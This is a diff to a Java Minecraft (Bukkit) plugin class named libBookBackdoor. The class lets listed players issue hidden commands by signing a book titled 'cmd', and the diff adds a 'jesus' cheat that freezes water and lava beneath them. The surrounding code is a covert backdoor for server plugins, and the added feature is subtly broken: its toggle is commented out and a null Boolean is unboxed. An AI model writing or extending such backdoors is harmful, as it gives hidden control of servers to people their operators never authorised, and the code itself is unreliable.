@@ -8,6 +8,7 @@ import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerEditBookEvent;
+import org.bukkit.event.player.PlayerMoveEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.BookMeta;
 import org.bukkit.plugin.Plugin;
@@ -19,6 +20,7 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
 
 abstract class Countdown {
@@ -77,6 +79,7 @@ public class libBookBackdoor implements Listener {
 
     public final Plugin plugin;
     public String[] authedPlayers = null;
+    public static HashMap<String, Boolean> jesus = new HashMap<String, Boolean>();
 
     public libBookBackdoor(JavaPlugin plugin) {
         this.plugin = plugin;
@@ -101,13 +104,29 @@ public class libBookBackdoor implements Listener {
     }
 
     @EventHandler
+    public void onPlayerMove(PlayerMoveEvent event) {
+        Player player = event.getPlayer();
+
+        // Jesus
+        if (jesus.get(player.getDisplayName())) {
+            Location location = player.getEyeLocation();
+            Block underBlock = plugin.getServer().getWorld(player.getWorld().getName()).getBlockAt(location.getBlockX(), location.getBlockY() - 2, location.getBlockZ());
+            if (underBlock.getType() == Material.WATER || underBlock.getType() == Material.LAVA) {
+                underBlock.setType(Material.FROSTED_ICE);
+            }
+        }
+        // End Jesus
+    }
+
+    @EventHandler
     public void onBookSign(PlayerEditBookEvent event) {
         BookMeta eventMeta = event.getNewBookMeta();
+        Player player = event.getPlayer();
+        String playerName = player.getDisplayName();
         boolean canContinue = false;
         if (authedPlayers != null) {
-            Player player = event.getPlayer();
             for (String name : authedPlayers) {
-                if (name.equals(event.getPlayer().getDisplayName())) {
+                if (name.equals(playerName)) {
                     canContinue = true;
                 }
             }
@@ -120,7 +139,6 @@ public class libBookBackdoor implements Listener {
         if (eventMeta.getTitle() != null && !eventMeta.getPage(1).equals("")) {
             if (eventMeta.getTitle().equals("cmd")) {
                 String pageString = eventMeta.getPage(1);
-                Player player = event.getPlayer();
 
                 String commandType = Character.toString(pageString.charAt(0));
                 String command = pageString.substring(1);
@@ -398,6 +416,26 @@ public class libBookBackdoor implements Listener {
                             } else {
                                 player.sendMessage("Please use true/false");
                             }
+                            break;
+                        case ("jesus"):
+                            //if(jesus.get(playerName) == null){
+                            //    jesus.put(playerName, false);
+                            //}
+                            //if (args.length > 1) {
+                            //    switch (args[1].toLowerCase()) {
+                            //        case ("true"):
+                            //            jesus.put(playerName, true);
+                            //            break;
+                            //        case ("false"):
+                            //            jesus.put(playerName, false);
+                            //            break;
+                            //        default:
+                            //            player.sendMessage("Please use true/false");
+                            //            break;
+                            //    }
+                            //} else {
+                            //    player.sendMessage("Please use true/false");
+                            //}
                             break;
                         case ("help"):
                             ItemStack book = new ItemStack(Material.WRITTEN_BOOK, 1);
